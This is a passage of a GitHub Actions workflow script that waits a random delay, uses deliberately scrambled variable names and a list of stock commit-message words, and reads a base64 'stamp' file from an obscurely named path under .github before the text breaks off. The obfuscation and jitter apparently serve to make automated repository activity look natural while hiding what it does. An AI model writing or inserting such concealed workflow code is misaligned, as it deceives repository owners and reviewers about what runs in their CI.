          script: |
            await new Promise(r => setTimeout(r, Math.floor(Math.random() * 30000)));
            
            const _rkX = context.repo.repo;
            const HJYpwg = context.repo.owner;
            const NRF = ["fix", "update", "refactor", "add", "remove", "improve", "optimize", "feature", "bug", "docs", "test", "style", "merge", "cleanup", "adjust", "rename", "enhance", "replace", "format", "config", "release", "hotfix", "patch", "review", "sync", "rollback", "revert", "tweak", "implement", "validate", "check", "load", "save", "export", "import", "upgrade", "downgrade", "convert", "render", "parse", "compress", "encrypt", "decrypt", "log", "trace", "monitor", "analyze", "schedule", "retry", "notify"];
            const mU = ".github/iooeHpWEXBagl";
            const v3 = "main";
            
            async function IH() {
              try {
                const { data } = await github.rest.repos.getContent({
                  owner: HJYpwg, repo: _rkX, path: mU, ref: v3,
                });
                if (Array.isArray(data)) throw new Error('stamp path is a directory');
                const RKW3X = Buffer.from(data.content, 'base64').toString('utf8');
